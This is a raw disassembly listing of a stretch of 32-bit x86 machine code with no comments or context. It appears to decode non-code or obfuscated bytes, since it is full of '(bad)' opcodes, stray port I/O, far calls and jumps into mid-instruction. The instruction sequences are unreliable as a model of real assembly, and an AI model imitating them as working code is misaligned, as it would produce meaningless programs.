  40e050:	cwde   
  40e051:	and    edi,edi
  40e053:	inc    esi
  40e054:	add    al,0x6c
  40e056:	pop    esi
  40e057:	xor    BYTE PTR ds:0x5ae0018,ah
  40e05d:	sub    eax,edi
  40e05f:	mov    ebx,0x174aae3
  40e064:	shl    BYTE PTR [eax],1
  40e066:	adc    al,0x1e
  40e068:	cmp    bh,BYTE PTR [ebp-0x550b6302]
  40e06e:	je     0x40e051
  40e070:	enter  0xfe21,0x0
  40e074:	pop    ebp
  40e075:	js     0x40e080
  40e077:	ror    ch,0x7c
  40e07a:	push   eax
  40e07b:	add    edx,ecx
  40e07d:	pop    es
  40e07e:	push   DWORD PTR [ebp-0x2a]
  40e081:	(bad)  
  40e082:	adc    al,0x66
  40e084:	mov    ebp,0x7dc02976
  40e089:	push   0xffffffc0
  40e08b:	adc    al,0xca
  40e08d:	mov    BYTE PTR [ecx+eax*1],bh
  40e090:	mov    edx,0x9e7d8307
  40e095:	add    al,0xf
  40e097:	test   DWORD PTR [esi+0x61000000],edx
  40e09d:	js     0x40e086
  40e09f:	and    al,0x7b
  40e0a1:	pop    es
  40e0a2:	add    BYTE PTR [ebx+0x4896d47],cl
  40e0a8:	add    BYTE PTR [ebx],al
  40e0aa:	inc    ebp
  40e0ab:	lock add BYTE PTR [eax],al
	...
  40e0ba:	add    BYTE PTR [eax+0x1],ah
  40e0bd:	push   eax
  40e0be:	call   DWORD PTR [edi-0x57]
  40e0c1:	out    0x74,al
  40e0c3:	aas    
  40e0c4:	js     0x40e0c3
  40e0c6:	push   0x4a
  40e0c8:	js     0x40e13d
  40e0ca:	adc    al,0xcd
  40e0cc:	in     eax,dx
  40e0cd:	pop    es
  40e0ce:	call   0x3e506c
  40e0d3:	rol    DWORD PTR [ebp+0x14],1
  40e0d6:	add    DWORD PTR [ebx-0x72f08aff],0xffffffed
  40e0dd:	repz call 0x3fbe65
  40e0e3:	push   ecx
  40e0e4:	rcr    DWORD PTR [ebp-0x37],0x48
  40e0e8:	adc    al,BYTE PTR [eax]
  40e0ea:	or     edi,DWORD PTR [eax-0xe]
  40e0ed:	add    al,0xe9
  40e0ef:	dec    esi
  40e0f0:	push   es
  40e0f1:	add    BYTE PTR [eax],al
  40e0f3:	xchg   ebx,eax
  40e0f4:	cmp    eax,0x780a6aec
  40e0f9:	jae    0x40e10f
  40e0fb:	arpl   WORD PTR [ebx],dx
  40e0fd:	cmp    BYTE PTR [eax],cl
  40e0ff:	sti    
  40e100:	(bad)  
  40e101:	mov    ecx,0x4037e4fe
  40e106:	adc    al,0xe0
  40e108:	lds    eax,FWORD PTR [edx]
  40e10a:	jne    0x40e170
  40e10c:	mov    bl,0x36
  40e10e:	hlt    
  40e10f:	mov    ebx,0xc4ff2854
  40e114:	pop    ss
  40e115:	les    ebx,FWORD PTR [esi-0x56]
  40e118:	pop    esi
  40e119:	pop    ss
  40e11a:	add    BYTE PTR [ecx+ecx*1+0x6568],dh
	...
  40e12d:	add    BYTE PTR [edx],ah
  40e12f:	pushf  
  40e130:	jg     0x40e176
  40e132:	mov    ebx,0xe0e84737
  40e137:	aam    0xff
  40e139:	rol    BYTE PTR [ebx-0x352e2467],0x5b
  40e140:	add    eax,DWORD PTR [eax]
  40e142:	arpl   WORD PTR [ebx-0x4c747d4e],cx
  40e148:	jns    0x40e18e
  40e14a:	sbb    DWORD PTR [edi],0x1f
  40e14d:	call   0xec880892
  40e152:	sub    cl,bl
  40e154:	fwait
  40e155:	jbe    0x40e1b8
  40e157:	xchg   edi,eax
  40e158:	fisubr DWORD PTR [edx]
  40e15a:	xor    DWORD PTR [edi],esp
  40e15c:	inc    edi
  40e15d:	in     al,dx
  40e15e:	js     0x40e141
  40e160:	mov    ds:0x8554968a,eax
  40e165:	rol    BYTE PTR [eax+0x2c039b1f],0x4d
  40e16c:	add    eax,0x57254355
  40e171:	in     al,0xd8
  40e173:	pop    eax
  40e174:	call   0xe805:0x3540a63a
  40e17b:	pop    eax
  40e17c:	mov    ds:0x472760ea,al
  40e181:	in     al,0x4
  40e183:	add    eax,0x2ffc179c
  40e188:	or     eax,0xe12ff454
  40e18d:	fwait
  40e18e:	ret    
  40e18f:	mov    cl,0xd
  40e191:	mov    cl,0x0
	...
  40e19f:	add    BYTE PTR [eax],al
  40e1a1:	pop    ecx
  40e1a2:	lds    edi,FWORD PTR [ebx+0x0]
  40e1a5:	fsubr  QWORD PTR [edi]
  40e1a7:	cmc    
  40e1a8:	fwait
  40e1a9:	jbe    0x40e1cb
  40e1ab:	div    BYTE PTR [eax-0x45723a87]
  40e1b1:	mov    ds:0x277ae910,al
  40e1b6:	leave  
  40e1b7:	jno    0x40e18c
  40e1b9:	out    0x3f,eax
  40e1bb:	mov    ebp,0xb13fde53
  40e1c0:	push   ebx
  40e1c1:	adc    DWORD PTR [ebp-0x5662539e],ebx
  40e1c7:	outs   dx,DWORD PTR ds:[esi]
  40e1c8:	inc    esi
  40e1c9:	mov    bl,0xa9
  40e1cb:	cmp    edx,eax
  40e1cd:	test   BYTE PTR [edx],ah
  40e1cf:	or     eax,0x238585b1
  40e1d4:	aam    0x7c
  40e1d6:	xor    eax,0xccf784fc
  40e1db:	call   0x13eb3617
  40e1e0:	fsub   DWORD PTR [ebp+0x2f]
  40e1e3:	mov    eax,ds:0x7df9d7b0
  40e1e8:	imul   ebp,DWORD PTR ss:[eax+0x334c0c1b],0xffffff91
  40e1f0:	fwait
  40e1f1:	bound  ebp,QWORD PTR [ebp+eiz*2-0x24135a50]
  40e1f8:	stos   DWORD PTR es:[edi],eax
  40e1f9:	cmp    DWORD PTR gs:[ecx],0xffffffb1
  40e1fd:	sub    eax,0x2f364da9
  40e202:	sahf   
  40e203:	sub    al,0x27
	...
  40e211:	add    BYTE PTR [eax],al
  40e213:	add    BYTE PTR [ecx+ebp*4],bl
  40e216:	add    BYTE PTR [edx],0x63
  40e219:	add    eax,0xbeb3e900
  40e21e:	rcl    ebp,0x60
  40e221:	push   edx
  40e222:	mov    edx,DWORD PTR ds:0xf174a89b
  40e228:	fdiv   DWORD PTR [ecx+esi*2-0x18df4cea]
  40e22f:	stos   BYTE PTR es:[edi],al
  40e230:	mov    eax,ds:0xd87cff05
  40e235:	mov    al,ds:0x560b63c
  40e23a:	or     ebp,DWORD PTR [ecx]
  40e23c:	xchg   ebp,eax
  40e23d:	add    bl,BYTE PTR [edi+0x20]
  40e240:	sahf   
  40e241:	add    BYTE PTR [eax],al
  40e243:	scas   eax,DWORD PTR es:[edi]
  40e244:	addr16 add eax,0xa0b754ff
  40e24a:	rcr    BYTE PTR [ebx-0x4],cl
  40e24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e24e:	mov    esi,0x4620c0
  40e253:	(bad)  
  40e254:	pop    edx
  40e255:	std    
  40e256:	push   esi
  40e257:	rcr    DWORD PTR [esi-0x11],1
  40e25a:	(bad)  
  40e25b:	call   0xe4b54ae9
  40e260:	adc    eax,0x60f1c1be
  40e265:	test   eax,0xa706a932
  40e26a:	(bad)  
  40e26b:	xchg   esi,eax
  40e26c:	mov    esp,0x5dd1adb6
  40e271:	xor    ah,al
  40e273:	xchg   BYTE PTR [edx+0x5e7fd],bl
	...
  40e285:	add    BYTE PTR [eax],al
  40e287:	pop    edx
  40e288:	test   al,0xfe
  40e28a:	loop   0x40e2ac
  40e28c:	xor    DWORD PTR ds:0x7c6060e,eax
  40e292:	jmp    0xa884f0ef
  40e297:	pusha  
  40e298:	test   al,0x74
  40e29a:	loope  0x40e264
  40e29c:	mov    ebx,0xfc60e934
  40e2a1:	mov    edi,0xfda8df00
  40e2a6:	jne    0x40e2ae
  40e2a8:	daa    
  40e2a9:	add    al,0xac
  40e2ab:	sbb    al,0x41
  40e2ad:	add    BYTE PTR [eax+0x5e],ch
  40e2b0:	cmp    eax,0xee450041
  40e2b5:	pop    es
  40e2b6:	call   0x3f9153
  40e2bb:	add    esp,eax
  40e2bd:	jae    0x40e2c8
  40e2bf:	push   ebp
  40e2c0:	out    dx,al
  40e2c1:	or     ecx,DWORD PTR [edi+0x416533cf]
  40e2c7:	retf   0x330b
  40e2ca:	inc    esp
  40e2cb:	sti    
  40e2cc:	add    edi,edi
  40e2ce:	jne    0x40e292
  40e2d0:	mov    edx,DWORD PTR [esi+0xb03ca35]
  40e2d6:	ror    BYTE PTR [edi],0xaa
  40e2d9:	std    
  40e2da:	jne    0x40e2a2
  40e2dc:	es add al,0xb4
  40e2df:	sbb    al,0x42
  40e2e1:	add    BYTE PTR [eax+0x38b],bh
  40e2e7:	jne    0x40e353
  40e2e9:	ror    BYTE PTR [eax],0x0
	...
  40e2f8:	add    BYTE PTR [eax],al
  40e2fa:	jp     0x40e348
  40e2fc:	mov    ebp,esp
  40e2fe:	stc    
  40e2ff:	mov    edi,0x93d56f2
  40e304:	jecxz  0x40e349
  40e306:	dec    ebx
  40e307:	add    edi,edi
  40e309:	jne    0x40e28d
  40e30b:	mov    eax,DWORD PTR [esi+esi*1-0x3ff4fc86]
  40e312:	pop    edi
  40e313:	add    DWORD PTR [edi+0x5e],ebx
  40e316:	adc    eax,ebp
  40e318:	add    al,BYTE PTR [eax]
  40e31a:	jp     0x40e346
  40e31c:	out    dx,eax
  40e31d:	mov    esi,DWORD PTR [edi]
  40e31f:	stos   DWORD PTR es:[edi],eax
  40e320:	jmp    0x3cc3d126
  40e325:	add    BYTE PTR [edi],cl
  40e327:	pop    ebp
  40e328:	mov    ds:0x42396368,al
  40e32d:	inc    ecx
  40e32e:	arpl   WORD PTR [edi],si
  40e330:	cmp    BYTE PTR [eax],cl
  40e332:	or     edi,DWORD PTR [ebp-0x4beb000c]
  40e338:	ret    0x6574
  40e33b:	(bad)  
  40e33c:	dec    esp
  40e33d:	leave  
  40e33e:	and    DWORD PTR [ecx-0x4b8174fe],esp
  40e344:	cdq    
  40e345:	and    ebx,esp
  40e347:	(bad)  
  40e348:	sti    
  40e349:	jae    0x40e395
  40e34b:	sbb    al,0xee
  40e34d:	or     al,0x6f
  40e34f:	mov    al,0x82
  40e351:	imul   ebp,DWORD PTR ds:[eax],0x63947ffe
  40e358:	ss or  ah,bl
  40e35b:	outs   dx,DWORD PTR ds:[esi]
  40e35c:	dec    edi
  40e35d:	je     0x40e35f
	...
  40e36b:	add    BYTE PTR [eax],al
  40e36d:	pop    esi
  40e36e:	sbb    al,0xee
  40e370:	pop    edi
  40e371:	ss fwait
  40e373:	les    eax,FWORD PTR [esi]
  40e375:	sbb    edi,0xffffff83
  40e378:	arpl   WORD PTR ds:[ecx-0x35],cx
  40e37c:	(bad)  
  40e37d:	push   ds
  40e37e:	mov    eax,0x9c630003
  40e383:	ret    
  40e384:	inc    esp
  40e385:	fwait
  40e386:	pushf  
  40e387:	add    al,BYTE PTR [eax]
  40e389:	arpl   WORD PTR [ebx],sp
  40e38b:	das    
  40e38c:	or     BYTE PTR [eax-0x1d],bh
  40e38f:	cmp    DWORD PTR [esi],0x44
  40e392:	or     ecx,ebx
  40e394:	xor    dh,0x87
  40e397:	add    esi,DWORD PTR [ebp+0x51]
  40e39a:	xchg   DWORD PTR [esi-0x8],eax
  40e39d:	bound  ebx,QWORD PTR [edx+eax*1-0x3c5f2a00]
  40e3a4:	inc    esp
  40e3a5:	push   edi
  40e3a6:	popf   
  40e3a7:	add    al,BYTE PTR [eax]
  40e3a9:	arpl   WORD PTR [ebx+0x349ef710],ax
  40e3af:	add    eax,DWORD PTR [eax]
  40e3b1:	arpl   WORD PTR ds:0xbf6936e9,ax
  40e3b7:	in     eax,0xe3
  40e3b9:	and    eax,0x63045540
  40e3be:	add    eax,0x495d83e9
  40e3c3:	mov    esp,0x41401406
  40e3c8:	cdq    
  40e3c9:	gs mov esi,0xa604abab
  40e3cf:	call   0x40e3d7
	...
  40e3e0:	loopne 0x40e409
  40e3e2:	and    eax,0x27026e03
  40e3e7:	add    eax,0xed693e43
  40e3ec:	in     al,0x30
  40e3ee:	pop    ecx
  40e3ef:	jns    0x40e450
  40e3f1:	std    
  40e3f2:	adc    DWORD PTR [eax],edx
  40e3f4:	jecxz  0x40e3db
  40e3f6:	enter  0x7536,0x85
  40e3fa:	jne    0x40e3fe
  40e3fc:	xor    DWORD PTR [eax],0xffffffd9
  40e3ff:	push   esp
  40e400:	enter  0x72fe,0x44
  40e404:	bound  edi,QWORD PTR [ebp-0x1b]
  40e407:	inc    esp
  40e408:	jecxz  0x40e3ef
  40e40a:	call   0x1e869245
  40e40f:	inc    ebp
  40e410:	jecxz  0x40e3f7
  40e412:	call   0x23fe984d
  40e417:	mov    eax,0x3e8a58c
  40e41c:	fsubr  DWORD PTR [edi]
  40e41e:	loope  0x40e498
  40e420:	(bad)  
  40e421:	cld    
  40e422:	xchg   ecx,eax
  40e423:	loope  0x40e419
  40e425:	in     eax,0xcc
  40e427:	ss dec edi
  40e429:	mov    edi,0x2f6403ed
  40e42e:	xchg   ebp,eax
  40e42f:	push   ebp
  40e430:	dec    ebx
  40e431:	icebp  
  40e432:	xchg   BYTE PTR [ebp+edx*2+0x6536a911],ch
  40e439:	inc    esp
  40e43a:	add    BYTE PTR [edi],dl
  40e43c:	or     bh,al
  40e43e:	add    ebp,ecx
  40e440:	mov    ebx,0x66459b
	...
  40e451:	add    BYTE PTR [eax],al
  40e453:	popf   
  40e454:	cdq    
  40e455:	inc    esi
  40e456:	imul   edi,DWORD PTR [edi],0xf73073a5
  40e45c:	sbb    esp,esi
  40e45e:	mov    bh,0xf8
  40e460:	adc    dh,bh
  40e462:	inc    esi
  40e463:	mov    DWORD PTR [ebx+0x5e],0x92230
  40e46a:	pushf  
  40e46b:	mov    esi,DWORD PTR [eax+0x3ab82582]
  40e471:	push   edi
  40e472:	push   0x45
  40e474:	stc    
  40e475:	call   DWORD PTR [ecx+ebp*8+0x9de3c87]
  40e47c:	inc    esi
  40e47d:	add    cl,ch
  40e47f:	xchg   ebp,eax
  40e480:	or     ebx,DWORD PTR [edi-0x59]
  40e483:	sbb    edi,eax
  40e485:	psubsw mm1,QWORD PTR [ebx+0x49]
  40e489:	adc    al,0xb0
  40e48b:	pop    ebp
  40e48c:	jno    0x40e4f3
  40e48e:	test   al,0x60
  40e490:	adc    al,0x83
  40e492:	mov    bl,BYTE PTR [esi+0x5]
  40e495:	add    BYTE PTR [eax],ah
  40e497:	bound  edx,QWORD PTR [ebp+0x65]
  40e49a:	sub    BYTE PTR [edi+0x14],bl
  40e49d:	xor    DWORD PTR [esi+0x66],0x5
  40e4a1:	add    BYTE PTR [eax],al
  40e4a3:	bound  ebx,QWORD PTR [ecx+0x65]
  40e4a6:	sub    BYTE PTR [edi+0x14],ah
  40e4a9:	and    DWORD PTR [edx+0x5e],0x5
  40e4ad:	add    BYTE PTR [edx+eiz*1-0x67],bl
  40e4b1:	dec    edi
  40e4b2:	je     0x40e4d6
  40e4b4:	popf   
  40e4b5:	dec    edi
  40e4b6:	ins    BYTE PTR es:[edi],dx
	...
  40e4c3:	add    BYTE PTR [eax],al
  40e4c5:	add    BYTE PTR [edx],ah
  40e4c7:	mov    eax,ds:0x7072964f
  40e4cc:	sub    BYTE PTR gs:[edi-0x5c],ah
  40e4d0:	je     0x40e4d2
  40e4d2:	cmp    al,BYTE PTR [eax+0x70cdf8bc]
  40e4d8:	mov    eax,DWORD PTR [ebp-0x1e]
  40e4db:	cmp    BYTE PTR [ebp-0x72c641bb],cl
  40e4e1:	inc    ebp
  40e4e2:	call   0x40e6:0xd635ff39
  40e4e9:	add    BYTE PTR [ebp-0x1917f02a],cl
  40e4ef:	jo     0x40e4ee
  40e4f1:	dec    DWORD PTR [edi+0x7f50dc46]
  40e4f7:	inc    esi
  40e4f8:	loopne 0x40e54a
  40e4fa:	jg     0x40e542
  40e4fc:	in     al,0x50
  40e4fe:	dec    ebp
  40e4ff:	xchg   esi,eax
  40e500:	scas   al,BYTE PTR es:[edi]
  40e501:	retfw  
  40e503:	pop    es
  40e504:	push   DWORD PTR [ebp-0x16]
  40e507:	jg     0x40e491
  40e509:	clc    
  40e50a:	dec    ebp
  40e50b:	jo     0x40e50a
  40e50d:	jne    0x40e575
  40e50f:	and    BYTE PTR [esp+edx*8+0x5d],al
  40e513:	(bad)  
  40e514:	fisttp DWORD PTR [edi+0x45c5d007]
  40e51a:	push   0x9
  40e51c:	add    BYTE PTR [eax],al
  40e51e:	retf   0x441c
  40e521:	int3   
  40e522:	jp     0x40e527
  40e524:	add    DWORD PTR [edx-0x46],ebp
  40e527:	add    DWORD PTR [eax],eax
  40e529:	push   0x0
	...
  40e537:	add    BYTE PTR [eax],al
  40e539:	mov    edx,0x478d0001
  40e53e:	mov    ch,0x4e
  40e540:	push   DWORD PTR [edi+0x7a412796]
  40e546:	mov    ds:0xa1f60fbe,al
  40e54b:	(bad)  
  40e54c:	dec    DWORD PTR [edx-0x752f8476]
  40e552:	sahf   
  40e553:	add    BYTE PTR [eax],0x7b
  40e556:	pop    es
  40e557:	add    BYTE PTR [ebx+0x3ab7e963],cl
  40e55d:	scas   al,BYTE PTR es:[edi]
  40e55e:	mov    cl,bh
  40e560:	xchg   BYTE PTR [edi-0x53],cl
  40e563:	add    al,BYTE PTR [eax]
  40e565:	dec    edi
  40e566:	sbb    BYTE PTR [eax],dh
  40e568:	rcr    al,1
  40e56a:	cdq    
  40e56b:	(bad)  
  40e56c:	mov    ch,BYTE PTR [esi+0x3001a580]
  40e572:	xchg   ecx,eax
  40e573:	test   eax,0x40341f74
  40e578:	in     al,0x24
  40e57a:	ret    0xe7d2
  40e57d:	cmp    al,0xff
  40e57f:	add    eax,DWORD PTR [eax]
  40e581:	loopne 0x40e54c
  40e583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e584:	call   FWORD PTR [ebp+0x28]
  40e587:	mov    ecx,0x85ad04ff
  40e58c:	jl     0x40e581
  40e58e:	lods   al,BYTE PTR ds:[esi]
  40e58f:	stc    
  40e590:	sbb    DWORD PTR [edi],0xffffffad
  40e593:	add    al,BYTE PTR [eax]
  40e595:	loopne 0x40e518
  40e597:	sahf   
  40e598:	call   DWORD PTR [ebp+0x30]
  40e59b:	ins    DWORD PTR es:[edi],dx
  40e59c:	inc    DWORD PTR [eax]
	...
  40e5aa:	add    BYTE PTR [eax],al
  40e5ac:	fsubr  QWORD PTR [ecx+ebp*4+0x6cf4d774]
  40e5b3:	pusha  
  40e5b4:	int3   
  40e5b5:	mov    ds:0x9b9b447a,eax
  40e5ba:	cs cld 
  40e5bc:	mov    esp,0x2efebb19
  40e5c1:	rcr    BYTE PTR [ebx-0x573cbd21],0x67
  40e5c8:	and    eax,esi
  40e5ca:	inc    edx
  40e5cb:	add    BYTE PTR [ebx-0x6b0009c0],cl
  40e5d1:	cld    
  40e5d2:	sbb    eax,DWORD PTR [edx+0x27]
  40e5d5:	in     eax,dx
  40e5d6:	add    edi,edi
  40e5d8:	push   cs
  40e5d9:	fs fwait
  40e5db:	sub    eax,0xb02ac37
  40e5e0:	mov    ds:0xfb0c1d05,eax
  40e5e5:	dec    ebx
  40e5e6:	and    eax,0x18ad6343
  40e5eb:	neg    BYTE PTR [edx+eiz*4+0x38]
  40e5ef:	sbb    al,0xaa
  40e5f1:	dec    ecx
  40e5f2:	sub    BYTE PTR [esp+ecx*2],al
  40e5f5:	sbb    BYTE PTR [ecx-0x17268d64],dh
  40e5fb:	add    ebp,DWORD PTR [eax-0x3b]
  40e5fe:	hlt    
  40e5ff:	or     ecx,ebx
  40e601:	xor    al,0xad
  40e603:	inc    edx
  40e604:	arpl   WORD PTR [ebp-0x5ddb0a4c],bp
  40e60a:	mov    eax,0xa849b21b
  40e60f:	add    eax,DWORD PTR [eax]
	...
  40e61d:	add    BYTE PTR [eax],al
  40e61f:	adc    al,0x18
  40e621:	xor    DWORD PTR [esi+edx*1+0x5803e8d6],ebx
  40e628:	lds    edi,FWORD PTR [ebx-0x16fa74c2]
  40e62e:	cwde   
  40e62f:	mov    dh,0xa1
  40e631:	fwait
  40e632:	test   DWORD PTR [edi+ebx*2],0xa1e5a8bb
  40e639:	fistp  DWORD PTR [ebx+0x46]
  40e63c:	inc    esp
  40e63d:	jmp    0x115235ea
  40e642:	pop    eax
  40e643:	das    
  40e644:	mov    ds:0xa14fa8fd,al
  40e649:	cmc    
  40e64a:	cs mov bh,0xa1
  40e64d:	jae    0x40e646
  40e64f:	mov    esp,0xada943b8
  40e654:	mov    eax,ds:0x17a5b453
  40e659:	shr    DWORD PTR [eax-0x3e3eeee9],0x37
  40e660:	mov    ds:0xa917a8c5,al
  40e665:	mov    ebp,0xffa1a72e
  40e66a:	cmp    edi,DWORD PTR [ebx-0x57]
  40e66d:	mov    bh,0xc
  40e66f:	retf   0xfea2
  40e672:	sbb    al,0xaf
  40e674:	test   eax,0xa2ba09f0
  40e679:	pop    esi
  40e67a:	aaa    
  40e67b:	sbb    bh,al
  40e67d:	psubsw mm4,QWORD PTR [ebp+0x6aeb8c]
	...
  40e690:	add    BYTE PTR [eax],al
  40e692:	or     al,0xa9
  40e694:	cmp    ah,0x54
  40e697:	or     cl,BYTE PTR [edi]
  40e699:	ins    BYTE PTR es:[edi],dx
  40e69a:	push   edi
  40e69b:	push   es
  40e69c:	add    cl,ch
  40e69e:	lods   eax,DWORD PTR ds:[esi]
  40e69f:	dec    ecx
  40e6a0:	hlt    
  40e6a1:	mov    ecx,0xb9f849b5
  40e6a6:	lods   eax,DWORD PTR ds:[esi]
  40e6a7:	dec    ecx
  40e6a8:	cld    
  40e6a9:	mov    ecx,0xd4ff037e
  40e6ae:	jo     0x40e65d
  40e6b0:	and    BYTE PTR [esi],bh
  40e6b2:	mov    ebx,0xb8bc829f
  40e6b7:	add    eax,0xa0b76c0f
  40e6bc:	(bad)  
  40e6bd:	jmp    0x7735008d
  40e6c2:	sub    eax,0x24fb6795
  40e6c7:	inc    esi
  40e6c8:	add    BYTE PTR [esi],dl
  40e6ca:	lea    edx,[ebp-0x5f313c19]
  40e6d0:	(bad)  
  40e6d1:	repnz mov al,ds:0x6021850f
  40e6d7:	add    eax,0x997d6400
  40e6dc:	dec    edi
  40e6dd:	pop    esp
  40e6de:	jne    0x40e67d
  40e6e0:	dec    edi
  40e6e1:	je     0x40e705
  40e6e3:	mov    eax,ds:0xa05f534f
  40e6e8:	je     0x40e6e3
  40e6ea:	clc    
  40e6eb:	stos   BYTE PTR es:[edi],al
  40e6ec:	cmc    
  40e6ed:	into   
  40e6ee:	mov    esp,0xa2007c83
  40e6f3:	or     cl,BYTE PTR [edi]
  40e6f5:	test   DWORD PTR [eax],eax
	...
  40e703:	add    BYTE PTR [eax],al
  40e705:	loop   0x40e710
  40e707:	add    BYTE PTR [eax],al
  40e709:	mov    ch,0xd6
  40e70b:	repz push 0x4144e7
  40e711:	rcr    BYTE PTR [edx-0x6485ffd0],cl
  40e717:	mov    esi,0xff24cf0f
  40e71c:	dec    DWORD PTR [edx+0x1d]
  40e71f:	inc    esp
  40e720:	hlt    
  40e721:	push   0x1e
  40e723:	inc    esp
  40e724:	clc    
  40e725:	push   0x1e
  40e727:	inc    esp
  40e728:	cld    
  40e729:	pop    edx
  40e72a:	sti    
  40e72b:	add    bh,bh
  40e72d:	das    
  40e72e:	hlt    
  40e72f:	out    0xb1,eax
  40e731:	mov    WORD PTR [eax-0x3],gs
  40e734:	add    DWORD PTR [edi],0x6c
  40e737:	dec    BYTE PTR [esi]
  40e739:	pop    DWORD PTR [esi+edi*8+0x441b0aff]
  40e740:	hlt    
  40e741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e742:	cdq    
  40e743:	lea    eax,[ebp-0x6a]
  40e746:	push   ds
  40e747:	inc    esp
  40e748:	hlt    
  40e749:	ficomp DWORD PTR [esp+eax*2]
  40e74c:	clc    
  40e74d:	ficomp DWORD PTR [esp+eax*2]
  40e750:	cld    
  40e751:	stos   BYTE PTR es:[edi],al
  40e752:	std    
  40e753:	add    edi,edi
  40e755:	iret   
  40e756:	repz out 0x89,eax
  40e759:	jl     0x40e7c3
  40e75b:	std    
  40e75c:	and    edi,0x6b
  40e75f:	push   DWORD PTR [ebp+eax*1+0x5f]
  40e763:	add    ebp,DWORD PTR [esp+ebx*8+0xff0048]
	...
  40e776:	add    BYTE PTR [eax],al
  40e778:	mov    ch,0x66
  40e77a:	std    
  40e77b:	(bad)  
  40e77c:	mov    edi,0xba416513
  40e781:	data16 std 
  40e783:	inc    DWORD PTR [ebp+0x63b4035e]
  40e789:	push   eax
  40e78a:	inc    ebp
  40e78b:	add    BYTE PTR [esi+ecx*8-0x1f73015b],dl
  40e792:	scas   eax,DWORD PTR es:[edi]
  40e793:	out    0x61,eax
  40e795:	bound  esp,QWORD PTR [ebp-0x640f5b02]
  40e79b:	add    BYTE PTR [ebx-0x52],ah
  40e79e:	add    al,BYTE PTR [ebx+0x411d3a2e]
  40e7a4:	arpl   WORD PTR [edi+0x2e],di
  40e7a7:	sub    eax,esp
  40e7a9:	mov    ecx,0xaca26572
  40e7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7af:	jae    0x40e734
  40e7b1:	sub    ebp,eax
  40e7b3:	mov    bl,0xbd
  40e7b5:	in     eax,dx
  40e7b6:	add    edi,edi
  40e7b8:	mov    bh,0xbf
  40e7ba:	sbb    dh,al
  40e7bc:	out    dx,al
  40e7bd:	in     al,dx
  40e7be:	add    ecx,DWORD PTR [ebp-0xaccb5a]
  40e7c4:	scas   al,BYTE PTR es:[edi]
  40e7c5:	push   eax
  40e7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7c7:	je     0x40e838
  40e7c9:	aaa    
  40e7ca:	xor    BYTE PTR [eax],cl
  40e7cc:	or     esp,DWORD PTR [ebp-0x29f30156]
  40e7d2:	ror    BYTE PTR [edi],0x63
  40e7d5:	jns    0x40e850
  40e7d7:	jmp    0x40e7b9
  40e7d9:	lock xchg esi,eax
  40e7db:	inc    BYTE PTR [eax]
	...
  40e7e9:	add    BYTE PTR [eax],al
  40e7eb:	outs   dx,BYTE PTR ds:[esi]
  40e7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ed:	call   0x5369:0xa5e78a9c
  40e7f4:	xor    DWORD PTR [eax-0x10],eax
  40e7f7:	xor    esi,edi
  40e7f9:	das    
  40e7fa:	or     bl,cl
  40e7fc:	xchg   edi,eax
  40e7fd:	dec    edx
  40e7fe:	dec    esp
  40e800:	xchg   ebx,eax
  40e801:	ret    0x5f74
  40e804:	aad    0xc0
  40e806:	pop    es
  40e807:	arpl   WORD PTR [edx+0x6ba66812],ax
  40e80d:	inc    ebx
  40e80e:	add    dh,bl
  40e810:	add    eax,0xad14b42c
  40e815:	aad    0x45
  40e817:	pushf  
  40e818:	sahf   
  40e819:	loope  0x40e7de
  40e81b:	wbinvd 
  40e81d:	mov    al,ds:0xae0564c2
  40e822:	aas    
  40e823:	ja     0x40e829
  40e825:	jmp    0x2bd14b2d
  40e82a:	cwde   
  40e82b:	and    al,0x9e
  40e82d:	xor    edi,esp
  40e82f:	test   al,ch
  40e831:	inc    edx
  40e832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e833:	or     ch,BYTE PTR gs:[ecx+0x13826530]
  40e83a:	cwde   
  40e83b:	push   esp
  40e83c:	sbb    edi,esp
  40e83e:	fmul   DWORD PTR [esp+ecx*8]
  40e841:	stos   BYTE PTR es:[edi],al
  40e842:	cld    
  40e843:	inc    esp
  40e844:	dec    esi
  40e845:	sar    BYTE PTR [edx-0x6367f7b7],cl
  40e84b:	mov    cl,0x4
  40e84d:	sub    cl,bh
	...
  40e85b:	add    BYTE PTR [eax],al
  40e85d:	add    ah,ch
  40e85f:	pop    ss
  40e860:	pop    esi
  40e861:	dec    esp
  40e862:	loopne 0x40e800
  40e864:	out    0x2e,eax
  40e866:	pop    bp
  40e868:	call   0x6a464a70
  40e86d:	stos   DWORD PTR es:[edi],eax
  40e86e:	arpl   WORD PTR [ecx],bx
  40e870:	out    dx,eax
  40e871:	fadd   st,st(4)
  40e873:	retf   
  40e874:	sub    bh,ah
  40e876:	cld    
  40e877:	bound  ecx,QWORD PTR [esi+ebx*1+0x3f5c05a2]
  40e87e:	push   DWORD PTR [esi+eiz*1]
  40e881:	das    
  40e882:	pop    ebx
  40e883:	lods   eax,DWORD PTR ds:[esi]
  40e884:	jmp    0x40e8cf
  40e886:	fcomp  QWORD PTR [ebp+0x1963ac69]
  40e88c:	in     al,0x80
  40e88e:	aam    0x2
  40e890:	jl     0x40e88f
  40e892:	loope  0x40e8b3
  40e894:	or     eax,0x73604
  40e899:	ret    0xcca0
  40e89c:	shl    ecx,0x60
  40e89f:	nop
  40e8a0:	inc    esp
  40e8a1:	aad    0x10
  40e8a3:	sahf   
  40e8a4:	je     0x40e897
  40e8a6:	clc    
  40e8a7:	stos   BYTE PTR es:[edi],al
  40e8a8:	pop    eax
  40e8a9:	(bad)  
  40e8aa:	mov    edi,0x3ce8f782
  40e8af:	or     BYTE PTR [ebx+0x61862c1],al
  40e8b5:	push   0x45
  40e8b7:	mov    cl,0xff
  40e8b9:	cmp    esi,DWORD PTR [ebp-0x16]
  40e8bc:	mov    edi,0x5a2a0
  40e8c1:	je     0x40e8c3
	...
  40e8cf:	add    BYTE PTR [eax],al
  40e8d1:	and    eax,0x8d9e4fb1
  40e8d6:	or     eax,0x9ca9a0e8
  40e8db:	(bad)  
  40e8dc:	loop   0x40e8fe
  40e8de:	adc    al,BYTE PTR [esi]
  40e8e0:	push   0x7d
  40e8e2:	test   eax,0xf03ef3ff
  40e8e7:	mov    edi,0x522a0
  40e8ec:	pop    esp
  40e8ed:	ins    DWORD PTR es:[edi],dx
